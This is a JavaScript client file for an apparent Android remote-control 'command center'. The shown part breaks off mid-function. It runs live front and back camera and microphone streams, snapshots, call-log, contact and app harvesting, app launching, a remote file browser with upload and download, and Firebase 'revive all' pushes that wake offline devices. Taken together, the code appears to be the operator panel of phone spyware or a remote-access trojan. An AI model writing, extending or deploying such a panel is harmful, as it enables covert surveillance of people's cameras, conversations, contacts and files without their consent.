// Command Center Core Client Logic — Native WebSocket Edition (Multi-Device + Contacts + Revive All)

// ─────────────────────────────────────────────────────────────
// Signaling URL resolution
// ─────────────────────────────────────────────────────────────

function getServerURL() {
  const hostname = window.location.hostname;
  if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
    return 'http://localhost:3000';
  }
  return window.location.origin;
}

function getWebSocketURL() {
  const base = getServerURL();
  if (base.startsWith('https://')) return 'wss://' + base.substring(8);
  if (base.startsWith('http://'))  return 'ws://'  + base.substring(7);
  return base;
}

// ─────────────────────────────────────────────────────────────
// SignalingWebSocket — Drop-in replacement for Socket.IO client
// ─────────────────────────────────────────────────────────────

class SignalingWebSocket {
  constructor(url) {
    this.url = url;
    this.ws = null;
    this._id = null;
    this._connected = false;
    this._listeners = new Map();
    this._shouldReconnect = false;
    this._reconnectDelay = 2000;
    this._reconnectMaxDelay = 10000;
    this._reconnectAttempts = 0;
    this._maxReconnectAttempts = 20;
    this._reconnectTimer = null;
  }

  on(eventName, handler) {
    if (!this._listeners.has(eventName)) {
      this._listeners.set(eventName, []);
    }
    this._listeners.get(eventName).push(handler);
    return this;
  }

  emit(eventName, payload) {
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      console.warn(`[WS] Cannot emit "${eventName}" — not connected`);
      return this;
    }

    let message;
    if (eventName === 'identify') {
      message = { type: 'identify', clientType: payload || 'web' };
    } else if (payload === undefined || payload === null) {
      message = { type: eventName };
    } else if (typeof payload === 'object') {
      message = Object.assign({ type: eventName }, payload);
    } else {
      message = { type: eventName, data: payload };
    }

    try {
      this.ws.send(JSON.stringify(message));
    } catch (e) {
      console.error(`[WS] Failed to send "${eventName}"`, e);
    }
    return this;
  }

  get id() { return this._id; }
  get connected() { return this._connected; }

  connect() {
    if (this.ws && (this.ws.readyState === WebSocket.OPEN || this.ws.readyState === WebSocket.CONNECTING)) {
      return this;
    }
    this._shouldReconnect = true;
    this._openSocket();
    return this;
  }

  disconnect() {
    this._shouldReconnect = false;
    if (this._reconnectTimer) {
      clearTimeout(this._reconnectTimer);
      this._reconnectTimer = null;
    }
    if (this.ws) {
      try { this.ws.close(1000, 'Client disconnect'); } catch (e) {}
      this.ws = null;
    }
    this._connected = false;
    this._id = null;
    return this;
  }

  _openSocket() {
    console.log('[WS] Opening connection to', this.url);
    try {
      this.ws = new WebSocket(this.url);
    } catch (e) {
      console.error('[WS] Failed to create WebSocket:', e);
      this._dispatch('connect_error', e);
      this._scheduleReconnect();
      return;
    }

    this.ws.onopen = () => {
      console.log('[WS] Connected');
      this._connected = true;
      this._reconnectAttempts = 0;
      this._dispatch('connect');
      this.emit('identify', 'web');
    };

    this.ws.onmessage = (event) => {
      let msg;
      try {
        msg = JSON.parse(event.data);
      } catch (e) {
        console.warn('[WS] Invalid JSON:', event.data);
        return;
      }

      const type = msg.type;
      if (!type) {
        console.warn('[WS] Message without type:', msg);
        return;
      }

      if (type === 'id') {
        this._id = msg.id || null;
        console.log('[WS] Assigned ID:', this._id);
        this._dispatch('id', this._id);
        return;
      }

      if (type === 'web-client-ready' || type === 'android-client-ready' ||
          type === 'web-client-disconnected' || type === 'android-client-disconnected') {
        this._dispatch(type, msg);
        return;
      }

      this._dispatch(type, msg);
    };

    this.ws.onerror = (e) => {
      console.warn('[WS] Error:', e);
      this._dispatch('connect_error', e);
    };

    this.ws.onclose = (e) => {
      console.log('[WS] Closed:', e.code, e.reason);
      this._connected = false;
      this._id = null;
      this._dispatch('disconnect', e);
      if (this._shouldReconnect) {
        this._scheduleReconnect();
      }
    };
  }

  _scheduleReconnect() {
    if (this._reconnectTimer) return;
    if (this._reconnectAttempts >= this._maxReconnectAttempts) {
      console.warn('[WS] Max reconnect attempts reached');
      return;
    }
    const delay = Math.min(
      this._reconnectDelay * Math.pow(1.5, this._reconnectAttempts),
      this._reconnectMaxDelay
    );
    this._reconnectAttempts++;
    console.log(`[WS] Reconnecting in ${Math.round(delay)}ms (attempt ${this._reconnectAttempts})`);
    this._reconnectTimer = setTimeout(() => {
      this._reconnectTimer = null;
      if (this._shouldReconnect) this._openSocket();
    }, delay);
  }

  _dispatch(eventName, payload) {
    const handlers = this._listeners.get(eventName);
    if (!handlers || handlers.length === 0) return;
    for (const handler of handlers) {
      try { handler(payload); }
      catch (e) { console.error(`[WS] Handler for "${eventName}" threw:`, e); }
    }
  }
}

// ─────────────────────────────────────────────────────────────
// Socket instance
// ─────────────────────────────────────────────────────────────

const socket = new SignalingWebSocket(getWebSocketURL());
socket.connect();

// ─────────────────────────────────────────────────────────────
// Multi-Device State
// ─────────────────────────────────────────────────────────────

const devices = new Map();          // wsId -> { id, model, name, deviceId, connectedAt }
let selectedDeviceId = null;        // currently selected device wsId

// ── Per-device caches ────────────────────────────────────────
const callLogsByDevice   = new Map();   // wsId -> [ {number, type, date, duration}, ... ]
const contactsByDevice   = new Map();   // wsId -> [ {name, phones:[...]}, ... ]  (normalized)
const appsByDevice       = new Map();   // wsId -> [ {name, package, version}, ... ]
const deviceInfoByDevice = new Map();   // wsId -> { model, manufacturer, version, battery, ... }

// ─────────────────────────────────────────────────────────────
// DOM References
// ─────────────────────────────────────────────────────────────

const videoFront = document.getElementById('remoteVideoFront');
const videoBack = document.getElementById('remoteVideoBack');
const tagFront = document.getElementById('tagFront');
const tagBack = document.getElementById('tagBack');

const statusDiv = document.getElementById('status');
const retryButton = document.getElementById('retryButton');
const debugLog = document.getElementById('debugLog');

const btnStartStream = document.getElementById('btnStartStream');
const btnStopStream  = document.getElementById('btnStopStream');
const btnRevive      = document.getElementById('btnRevive');
const btnReviveAll   = document.getElementById('btnReviveAll');

const infoModel = document.getElementById('infoModel');
const infoManufacturer = document.getElementById('infoManufacturer');
const infoVersion = document.getElementById('infoVersion');
const infoBattery = document.getElementById('infoBattery');

// Tab buttons
const tabCalls = document.getElementById('tabCalls');
const tabApps = document.getElementById('tabApps');
const tabContacts = document.getElementById('tabContacts');

// Tab panes
const paneCalls = document.getElementById('paneCalls');
const paneApps = document.getElementById('paneApps');
const paneContacts = document.getElementById('paneContacts');

// Panes content
const callLogList = document.getElementById('callLogList');
const appList = document.getElementById('appList');
const contactList = document.getElementById('contactList');

// Search / refresh inputs
const appSearchInput = document.getElementById('appSearchInput');
const btnRefreshApps = document.getElementById('btnRefreshApps');

const contactSearchInput = document.getElementById('contactSearchInput');
const btnRefreshContacts = document.getElementById('btnRefreshContacts');

// Metrics
const infoBatteryDetails = document.getElementById('infoBatteryDetails');
const storageText = document.getElementById('storageText');
const storageProgress = document.getElementById('storageProgress');
const videoQualitySelect = document.getElementById('videoQualitySelect');

// File explorer
const fsPathInput = document.getElementById('fsPathInput');
const fsBackBtn = document.getElementById('fsBackBtn');
const fsGoBtn = document.getElementById('fsGoBtn');
const fileListDiv = document.getElementById('fileList');
const fsSortSelect = document.getElementById('fsSortSelect');

// Snapshot
const btnSnapFront = document.getElementById('btnSnapFront');
const btnSnapBack = document.getElementById('btnSnapBack');
const snapshotModal = document.getElementById('snapshotModal');
const snapshotPreview = document.getElementById('snapshotPreview');
const btnDownloadSnapshot = document.getElementById('btnDownloadSnapshot');
const btnCloseSnapshot = document.getElementById('btnCloseSnapshot');

// Talkback
const talkbackToggle = document.getElementById('talkbackToggle');

// Upload
const fsUploadArea = document.getElementById('fsUploadArea');
const fsUploadInput = document.getElementById('fsUploadInput');
const fsUploadLabel = document.getElementById('fsUploadLabel');
const fsUploadProgress = document.getElementById('fsUploadProgress');

// Preview
const previewModal = document.getElementById('previewModal');
const previewTitle = document.getElementById('previewTitle');
const previewProgress = document.getElementById('previewProgress');
const previewContent = document.getElementById('previewContent');
const previewCloseBtn = document.getElementById('previewCloseBtn');

// Device Selector
const deviceSelector = document.getElementById('deviceSelector');
const deviceCount = document.getElementById('deviceCount');

// ─────────────────────────────────────────────────────────────
// RTCPeerConnection / Media State
// ─────────────────────────────────────────────────────────────

let peer;
let myId;
let audioTrack = null;
let frontVideoTrack = null;
let backVideoTrack = null;
let localMicStream = null;
let localMicSender = null;

let activeDownloads = {};
let isTalkbackActive = false;

let currentSortMode = 'name-asc';
let currentFilesCache = [];
let currentFilesPath = '';

const thumbCache = new Map();
const pendingThumbBatches = new Map();
let thumbBatchCounter = 0;
let currentThumbObserver = null;

let currentPreview = null;
let currentPreviewBlobUrl = null;

const rtcConfig = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
  ]
};

// ─────────────────────────────────────────────────────────────
// Diagnostics
// ─────────────────────────────────────────────────────────────

function updateStatus(message) {
  console.log(message);
  statusDiv.textContent = message;
  logDebug(message);
  retryButton.style.display = message.includes('Failed') || message.includes('disconnected') ? 'block' : 'none';
}

function logDebug(message) {
  const logEntry = document.createElement('div');
  logEntry.className = 'terminal-entry';
  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  debugLog.prepend(logEntry);
  while (debugLog.children.length > 60) {
    debugLog.removeChild(debugLog.lastChild);
  }
}

function reconnectSocket() {
  updateStatus('Reconnecting to server...');
  socket.connect();
}

// ─────────────────────────────────────────────────────────────
// Device List Management
// ─────────────────────────────────────────────────────────────

function getDeviceLabel(id) {
  const dev = devices.get(id);
  if (!dev) return id;
  const name = dev.name || dev.model;
  if (name) return name;
  return 'Device ' + id.substring(Math.max(0, id.length - 6));
}

function renderDeviceList() {
  const currentValue = selectedDeviceId || '';
  deviceSelector.innerHTML = '';

  if (devices.size === 0) {
    const opt = document.createElement('option');
    opt.value = '';
    opt.textContent = '— No devices —';
    deviceSelector.appendChild(opt);
    deviceSelector.disabled = true;
  } else {
    deviceSelector.disabled = false;
    devices.forEach((dev, id) => {
      const opt = document.createElement('option');
      opt.value = id;
      opt.textContent = getDeviceLabel(id);
      if (id === currentValue) opt.selected = true;
      deviceSelector.appendChild(opt);
    });
  }

  deviceCount.textContent = devices.size;

  const hasSelection = !!selectedDeviceId && devices.has(selectedDeviceId);
  btnStartStream.disabled = !hasSelection;
  btnStopStream.disabled = !hasSelection;
  btnRevive.disabled = !hasSelection;
  // btnReviveAll is ALWAYS enabled — works even with zero devices
}

function setVideoTagState(el, text, colorVar, bgVar, borderVar) {
  el.textContent = text;
  el.style.color = colorVar;
  el.style.background = bgVar;
  el.style.borderColor = borderVar;
}

function resetMediaState() {
  if (peer) {
    try { peer.close(); } catch (e) {}
    peer = null;
  }
  videoFront.srcObject = null;
  videoBack.srcObject = null;
  frontVideoTrack = null;
  backVideoTrack = null;
  audioTrack = null;

  if (localMicStream) {
    localMicStream.getTracks().forEach(t => t.stop());
    localMicStream = null;
  }
  localMicSender = null;
  isTalkbackActive = false;
  talkbackToggle.textContent = '🎙️ Talkback OFF';
  talkbackToggle.style.color = 'var(--text-muted)';
  talkbackToggle.style.borderColor = 'rgba(255,255,255,0.05)';
  talkbackToggle.style.background = 'transparent';

  setVideoTagState(tagFront, 'IDLE', 'var(--danger)', 'rgba(239, 68, 68, 0.15)', 'var(--danger)');
  setVideoTagState(tagBack,  'IDLE', 'var(--danger)', 'rgba(239, 68, 68, 0.15)', 'var(--danger)');
}

function resetUIForNoDevice() {
  resetMediaState();

  callLogList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No device selected.</div>';
  appList.innerHTML     = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No device selected.</div>';
  contactList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No device selected.</div>';
  fileListDiv.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 40px; font-size: 0.85rem;">No device selected.</div>';

  infoModel.textContent = '—';
  infoManufacturer.textContent = '—';
  infoVersion.textContent = '—';
  infoBattery.textContent = '—';
  infoBattery.style.color = '';
  infoBatteryDetails.textContent = '—';
  storageText.textContent = '0 GB / 0 GB';
  storageProgress.style.width = '0%';
}

// ─────────────────────────────────────────────────────────────
// Per-device data rendering
// ─────────────────────────────────────────────────────────────

function renderCallLogs(deviceId) {
  const logs = callLogsByDevice.get(deviceId) || [];
  callLogList.innerHTML = '';

  if (logs.length === 0) {
    callLogList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No call logs available.</div>';
    return;
  }

  logs.forEach(call => {
    const item = document.createElement('div');
    item.className = 'data-item';
    item.innerHTML = `
      <div class="data-icon">📞</div>
      <div class="data-details">
        <div class="data-title">${escapeHtml(call.number)} (${escapeHtml(call.type)})</div>
        <div class="data-desc">Duration: ${call.duration}s</div>
      </div>
      <div class="data-time">${escapeHtml(call.date)}</div>
    `;
    callLogList.appendChild(item);
  });
}

function renderApps(deviceId) {
  const apps = appsByDevice.get(deviceId) || [];
  appList.innerHTML = '';

  if (apps.length === 0) {
    appList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No applications profiles synchronized yet. Click sync.</div>';
    return;
  }

  apps.forEach(app => {
    const item = document.createElement('div');
    item.className = 'data-item';
    item.innerHTML = `
      <div class="data-icon">📱</div>
      <div class="data-details">
        <div class="data-title">${escapeHtml(app.name)}</div>
        <div class="data-desc">${escapeHtml(app.package)} (v${escapeHtml(app.version)})</div>
      </div>
      <button class="btn-explorer btn-primary btn-launch-app" data-package="${escapeHtml(app.package)}" style="padding: 6px 12px; font-size: 0.75rem; box-shadow: none;">Launch</button>
    `;
    appList.appendChild(item);
  });

  appList.querySelectorAll('.btn-launch-app').forEach(btn => {
    btn.addEventListener('click', (e) => {
      if (!selectedDeviceId) return;
      const pkg = e.target.getAttribute('data-package');
      logDebug(`[CMD] Request launch for application: ${pkg}`);
      socket.emit('cmd:launch_app', { to: selectedDeviceId, packageName: pkg });
    });
  });

  const q = appSearchInput.value.toLowerCase();
  if (q) {
    appList.querySelectorAll('.data-item').forEach(item => {
      const text = item.textContent.toLowerCase();
      item.style.display = text.includes(q) ? 'flex' : 'none';
    });
  }
}

function renderContacts(deviceId) {
  const contacts = contactsByDevice.get(deviceId) || [];
  contactList.innerHTML = '';

  if (contacts.length === 0) {
    contactList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No contacts synchronized yet. Click sync.</div>';
    return;
  }

  contacts.forEach(contact => {
    const item = document.createElement('div');
    item.className = 'data-item';

    const initial = (contact.name || '?').trim().charAt(0).toUpperCase() || '?';
    const phonesHtml = contact.phones.length > 0
      ? contact.phones.map(p => escapeHtml(p)).join(' • ')
      : '—';

    item.innerHTML = `
      <div class="data-icon" style="font-weight: 700; font-size: 0.95rem;">${escapeHtml(initial)}</div>
      <div class="data-details">
        <div class="data-title">${escapeHtml(contact.name)}</div>
        <div class="data-desc" style="font-family: var(--font-mono); font-size: 0.78rem;">${phonesHtml}</div>
      </div>
    `;
    contactList.appendChild(item);
  });

  const q = contactSearchInput.value.toLowerCase();
  if (q) {
    contactList.querySelectorAll('.data-item').forEach(item => {
      const text = item.textContent.toLowerCase();
      item.style.display = text.includes(q) ? 'flex' : 'none';
    });
  }
}

function renderDeviceInfo(deviceId) {
  const info = deviceInfoByDevice.get(deviceId);
  if (!info) {
    infoModel.textContent = '—';
    infoManufacturer.textContent = '—';
    infoVersion.textContent = '—';
    infoBattery.textContent = '—';
    infoBattery.style.color = '';
    infoBatteryDetails.textContent = '—';
    storageText.textContent = '0 GB / 0 GB';
    storageProgress.style.width = '0%';
    return;
  }

  infoModel.textContent = info.model || '—';
  infoManufacturer.textContent = info.manufacturer || '—';
  infoVersion.textContent = info.version ? `Android ${info.version}` : '—';

  if (info.battery !== undefined && info.battery !== null) {
    infoBattery.textContent = `${info.battery}%`;
    if (info.battery <= 15) infoBattery.style.color = 'var(--danger)';
    else if (info.battery <= 35) infoBattery.style.color = 'var(--warning)';
    else infoBattery.style.color = 'var(--success)';
  } else {
    infoBattery.textContent = '—';
    infoBattery.style.color = '';
  }

  if (info.batteryTemp !== undefined && info.chargingSource) {
    infoBatteryDetails.textContent = `${info.batteryTemp}°C • ${info.chargingSource}`;
  } else {
    infoBatteryDetails.textContent = '—';
  }

  if (info.storageTotal !== undefined && info.storageFree !== undefined) {
    const occupied = (info.storageTotal - info.storageFree).toFixed(1);
    storageText.textContent = `${occupied} GB / ${info.storageTotal} GB`;
    const pct = ((occupied / info.storageTotal) * 100).toFixed(0);
    storageProgress.style.width = `${pct}%`;
  } else {
    storageText.textContent = '0 GB / 0 GB';
    storageProgress.style.width = '0%';
  }
}

function renderCachedDataForDevice(deviceId) {
  renderCallLogs(deviceId);
  renderApps(deviceId);
  renderContacts(deviceId);
  renderDeviceInfo(deviceId);
}

// ─────────────────────────────────────────────────────────────
// Device Selection
// ─────────────────────────────────────────────────────────────

function selectDevice(id) {
  if (!devices.has(id)) return;
  if (id === selectedDeviceId) return;

  const previousId = selectedDeviceId;

  if (previousId && devices.has(previousId)) {
    try {
      socket.emit('cmd:stop', { to: previousId });
      logDebug(`[DEVICE] Sent cmd:stop to previous device ${previousId}`);
    } catch (e) {}
  }

  resetMediaState();
  clearFileExplorerUI();

  selectedDeviceId = id;
  renderDeviceList();

  const label = getDeviceLabel(id);
  updateStatus(`Active device: ${label}`);
  logDebug(`[DEVICE] Selected: ${label} (${id})`);

  renderCachedDataForDevice(id);

  requestFileList(currentPath);
}

function clearFileExplorerUI() {
  currentFilesCache = [];
  currentFilesPath = '';
  fileListDiv.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 40px; font-size: 0.85rem;">Loading directory...</div>';
}

deviceSelector.addEventListener('change', (e) => {
  const id = e.target.value;
  if (id && id !== selectedDeviceId) {
    selectDevice(id);
  }
});

// ─────────────────────────────────────────────────────────────
// Stream Control Buttons
// ─────────────────────────────────────────────────────────────

if (btnStartStream) {
  btnStartStream.addEventListener('click', () => {
    if (!selectedDeviceId) return;
    logDebug(`[CMD] Sending start command to ${getDeviceLabel(selectedDeviceId)}`);
    socket.emit('cmd:start', { to: selectedDeviceId });
    updateStatus('Streaming start requested');
  });
}

if (btnStopStream) {
  btnStopStream.addEventListener('click', () => {
    if (!selectedDeviceId) return;
    logDebug(`[CMD] Sending stop command to ${getDeviceLabel(selectedDeviceId)}`);
    socket.emit('cmd:stop', { to: selectedDeviceId });
    updateStatus('Streaming stop requested');
  });
}

if (btnRevive) {
  btnRevive.addEventListener('click', () => {
    if (!selectedDeviceId) return;
    logDebug('[CMD] Sending FCM revive command');
    updateStatus('Revive command sent via FCM');

    fetch('/api/fcm/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ wsId: selectedDeviceId, command: 'revive' })
    })
      .then(r => r.json())
      .then(data => {
        if (data.success) logDebug('[CMD] FCM revive delivered successfully');
        else logDebug('[CMD] FCM revive failed: ' + (data.error || 'unknown'));
      })
      .catch(e => logDebug('[CMD] FCM revive error: ' + e.message));
  });
}

// ── Revive All: broadcast FCM to every known device (online + offline) ──
if (btnReviveAll) {
  btnReviveAll.addEventListener('click', () => {
    logDebug('[REVIVE] Broadcasting FCM wake-up to ALL known devices...');
    updateStatus('Broadcasting revive signal to all devices...');

    fetch('/api/fcm/send-to-all', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command: 'revive' })
    })
      .then(r => r.json())
      .then(data => {
        if (data.success) {
          const msg = `Broadcast: sent=${data.sent || 0}, failed=${data.failed || 0}`;
          logDebug('[REVIVE] ' + msg);
          updateStatus(msg);

          if ((data.sent || 0) > 0) {
            logDebug('[REVIVE] Devices should reconnect within 5-15 seconds...');
            setTimeout(() => {
              fetch('/api/devices/known')
                .then(r => r.json())
                .then(known => {
                  const online = (known.devices || []).filter(d => d.online).length;
                  logDebug(`[REVIVE] Devices online now: ${online} / ${known.count || 0}`);
                })
                .catch(() => {});
            }, 8000);
          } else if ((data.message || '').length > 0) {
            logDebug('[REVIVE] ' + data.message);
          }
        } else {
          const err = data.error || 'unknown';
          logDebug('[REVIVE] Broadcast failed: ' + err);
          updateStatus('Revive broadcast failed: ' + err);
        }
      })
      .catch(e => {
        logDebug('[REVIVE] Error: ' + e.message);
        updateStatus('Revive broadcast error');
      });
  });
}

// ─────────────────────────────────────────────────────────────
// Telemetry Tab Navigation
// ─────────────────────────────────────────────────────────────

function switchTab(activeTab, activePane) {
  [tabCalls, tabApps, tabContacts].forEach(t => t.classList.remove('active'));
  [paneCalls, paneApps, paneContacts].forEach(p => p.style.display = 'none');

  activeTab.classList.add('active');
  activePane.style.display = (activePane === paneApps || activePane === paneContacts) ? 'flex' : 'block';
}

tabCalls.addEventListener('click', () => switchTab(tabCalls, paneCalls));

tabApps.addEventListener('click', () => {
  switchTab(tabApps, paneApps);
  if (selectedDeviceId) {
    const cache = appsByDevice.get(selectedDeviceId);
    if (!cache || cache.length === 0) {
      socket.emit('cmd:get_apps', { to: selectedDeviceId });
    }
  }
});

tabContacts.addEventListener('click', () => {
  switchTab(tabContacts, paneContacts);
  if (selectedDeviceId) {
    const cache = contactsByDevice.get(selectedDeviceId);
    if (!cache || cache.length === 0) {
      socket.emit('cmd:get_contacts', { to: selectedDeviceId });
    }
  }
});

btnRefreshApps.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  logDebug('[CMD] Syncing installed applications');
  socket.emit('cmd:get_apps', { to: selectedDeviceId });
});

btnRefreshContacts.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  logDebug('[CMD] Syncing contacts');
  socket.emit('cmd:get_contacts', { to: selectedDeviceId });
});

appSearchInput.addEventListener('input', (e) => {
  const query = e.target.value.toLowerCase();
  appList.querySelectorAll('.data-item').forEach(item => {
    const text = item.textContent.toLowerCase();
    item.style.display = text.includes(query) ? 'flex' : 'none';
  });
});

contactSearchInput.addEventListener('input', (e) => {
  const query = e.target.value.toLowerCase();
  contactList.querySelectorAll('.data-item').forEach(item => {
    const text = item.textContent.toLowerCase();
    item.style.display = text.includes(query) ? 'flex' : 'none';
  });
});

// ─────────────────────────────────────────────────────────────
// Utilities
// ─────────────────────────────────────────────────────────────

function escapeHtml(str) {
  if (!str) return '';
  return str.toString()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// ─────────────────────────────────────────────────────────────
// WebRTC Stream Management
// ─────────────────────────────────────────────────────────────

function updateStreams() {
  if (frontVideoTrack) {
    const frontStream = new MediaStream([frontVideoTrack]);
    if (audioTrack) frontStream.addTrack(audioTrack);
    videoFront.srcObject = frontStream;
    setVideoTagState(tagFront, 'FRONT LIVE', 'var(--success)', 'rgba(16, 185, 129, 0.2)', 'var(--success)');
    videoFront.play().catch(e => console.log('Autoplay front blocked'));
  }
  if (backVideoTrack) {
    const backStream = new MediaStream([backVideoTrack]);
    if (audioTrack) backStream.addTrack(audioTrack);
    videoBack.srcObject = backStream;
    setVideoTagState(tagBack, 'BACK LIVE', 'var(--success)', 'rgba(16, 185, 129, 0.2)', 'var(--success)');
    videoBack.play().catch(e => console.log('Autoplay back blocked'));
  }
}

// ─────────────────────────────────────────────────────────────
// Talkback Intercom
// ─────────────────────────────────────────────────────────────

talkbackToggle.addEventListener('click', async () => {
  if (!selectedDeviceId || !peer) return;

  if (isTalkbackActive) {
    isTalkbackActive = false;
    talkbackToggle.textContent = '🎙️ Talkback OFF';
    talkbackToggle.style.color = 'var(--text-muted)';
    talkbackToggle.style.borderColor = 'rgba(255,255,255,0.05)';
    talkbackToggle.style.background = 'transparent';

    if (localMicSender) {
      peer.removeTrack(localMicSender);
      localMicSender = null;
    }
    if (localMicStream) {
      localMicStream.getTracks().forEach(track => track.stop());
      localMicStream = null;
    }
    logDebug('[TALKBACK] Microphone transmission suspended');
  } else {
    try {
      localMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const track = localMicStream.getAudioTracks()[0];
      localMicSender = peer.addTrack(track, localMicStream);

      const offer = await peer.createOffer();
      await peer.setLocalDescription(offer);
      socket.emit('signal', {
        to: selectedDeviceId,
        from: myId,
        signal: { type: 'offer', sdp: offer.sdp }
      });

      isTalkbackActive = true;
      talkbackToggle.textContent = '🎙️ Talkback ACTIVE';
      talkbackToggle.style.color = '#10b981';
      talkbackToggle.style.borderColor = '#10b981';
      talkbackToggle.style.background = 'rgba(16, 185, 129, 0.1)';
      logDebug('[TALKBACK] Microphone transmission active');
    } catch (err) {
      logDebug('[TALKBACK] Microphone capture blocked: ' + err.message);
    }
  }
});

// ─────────────────────────────────────────────────────────────
// Streaming Quality
// ─────────────────────────────────────────────────────────────

videoQualitySelect.addEventListener('change', (e) => {
  if (!selectedDeviceId) return;
  const quality = e.target.value;
  logDebug(`[CMD] Changing video quality: ${quality}`);
  socket.emit('cmd:set_quality', { to: selectedDeviceId, quality: quality });
});

// ─────────────────────────────────────────────────────────────
// Snapshot Actions
// ─────────────────────────────────────────────────────────────

btnSnapFront.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  logDebug('[CMD] Capturing snapshot frame: Front lens');
  socket.emit('cmd:take_snapshot', { to: selectedDeviceId, useFront: true });
});

btnSnapBack.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  logDebug('[CMD] Capturing snapshot frame: Back lens');
  socket.emit('cmd:take_snapshot', { to: selectedDeviceId, useFront: false });
});

let currentSnapshotBase64 = null;

btnCloseSnapshot.addEventListener('click', () => {
  snapshotModal.classList.remove('active');
  snapshotPreview.src = '';
  currentSnapshotBase64 = null;
});

btnDownloadSnapshot.addEventListener('click', () => {
  if (currentSnapshotBase64) {
    downloadBase64File(currentSnapshotBase64, `snapshot_${Date.now()}.jpg`);
  }
});

// ─────────────────────────────────────────────────────────────
// Thumbnail System
// ─────────────────────────────────────────────────────────────

function requestThumbBatch(items) {
  return new Promise((resolve) => {
    if (!selectedDeviceId || items.length === 0) {
      resolve();
      return;
    }

    const batchId = 'batch_' + (++thumbBatchCounter) + '_' + Date.now();
    const paths = items.map(i => i.path);

    pendingThumbBatches.set(batchId, { items, resolve });

    socket.emit('fs:thumb_request', {
      to: selectedDeviceId,
      batchId: batchId,
      paths: paths
    });

    logDebug(`[THUMB] Requested batch ${batchId} (${items.length} files)`);
  });
}

function setupLazyThumbnails(fileItems) {
  if (currentThumbObserver) {
    currentThumbObserver.disconnect();
    currentThumbObserver = null;
  }

  const pending = [];
  fileItems.forEach(item => {
    const path = item.dataset.thumbPath;
    const kind = item.dataset.thumbKind;
    if (path && (kind === 'image' || kind === 'video')) {
      if (thumbCache.has(path)) {
        applyThumbnailToItem(item, path);
      } else {
        pending.push({ element: item, path, kind });
      }
    }
  });

  if (pending.length === 0) return;

  const BATCH_SIZE = 20;
  const batches = [];
  for (let i = 0; i < pending.length; i += BATCH_SIZE) {
    batches.push(pending.slice(i, i + BATCH_SIZE));
  }

  let currentBatchIndex = 0;
  let isBatchInFlight = false;

  const observer = new IntersectionObserver((entries) => {
    const visibleNow = [];
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const el = entry.target;
        visibleNow.push({ element: el, path: el.dataset.thumbPath, kind: el.dataset.thumbKind });
        observer.unobserve(el);
      }
    });

    if (visibleNow.length > 0 && !isBatchInFlight && currentBatchIndex < batches.length) {
      isBatchInFlight = true;
      const batch = batches[currentBatchIndex++];
      requestThumbBatch(batch.map(b => ({ path: b.path, kind: b.kind })))
        .finally(() => {
          isBatchInFlight = false;
          batch.forEach(b => applyThumbnailToItem(b.element, b.path));
          if (currentBatchIndex < batches.length) {
            setTimeout(() => {
              const nextBatch = batches[currentBatchIndex];
              if (nextBatch && nextBatch.length > 0) {
                isBatchInFlight = true;
                requestThumbBatch(nextBatch.map(b => ({ path: b.path, kind: b.kind })))
                  .finally(() => {
                    isBatchInFlight = false;
                    nextBatch.forEach(b => applyThumbnailToItem(b.element, b.path));
                  });
                currentBatchIndex++;
              }
            }, 200);
          }
        });
    }
  }, { root: fileListDiv, rootMargin: '100px', threshold: 0.01 });

  pending.forEach(p => observer.observe(p.element));
  currentThumbObserver = observer;
}

function applyThumbnailToItem(item, path) {
  const cached = thumbCache.get(path);
  if (!cached) return;

  const iconEl = item.querySelector('.file-icon');
  if (!iconEl) return;

  const wrapper = document.createElement('div');
  wrapper.style.cssText = 'width: 48px; height: 48px; border-radius: 8px; overflow: hidden; flex-shrink: 0; background: #000; position: relative; margin-right: 14px;';

  const img = document.createElement('img');
  img.src = cached.dataUrl;
  img.style.cssText = 'width: 100%; height: 100%; object-fit: cover; display: block;';
  wrapper.appendChild(img);

  if (cached.kind === 'video') {
    const overlay = document.createElement('div');
    overlay.textContent = '▶';
    overlay.style.cssText = 'position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-size: 20px; text-shadow: 0 0 6px rgba(0,0,0,0.9); pointer-events: none;';
    wrapper.appendChild(overlay);
  }

  wrapper.style.cursor = 'pointer';
  wrapper.title = 'Click to preview';
  wrapper.onclick = (e) => { e.stopPropagation(); requestFilePreview(path); };

  iconEl.replaceWith(wrapper);
}

// ─────────────────────────────────────────────────────────────
// Preview System
// ─────────────────────────────────────────────────────────────

function isPreviewableKind(kind) {
  return kind === 'image' || kind === 'video';
}

function requestFilePreview(path) {
  if (!selectedDeviceId) return;

  const fileName = path.split('/').pop();
  openPreviewModal(fileName);

  const requestId = 'prev_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);

  currentPreview = {
    requestId: requestId,
    name: fileName,
    path: path,
    size: 0,
    type: '',
    kind: '',
    chunks: [],
    receivedSize: 0,
    mediaSource: null,
    sourceBuffer: null,
    blobUrl: null,
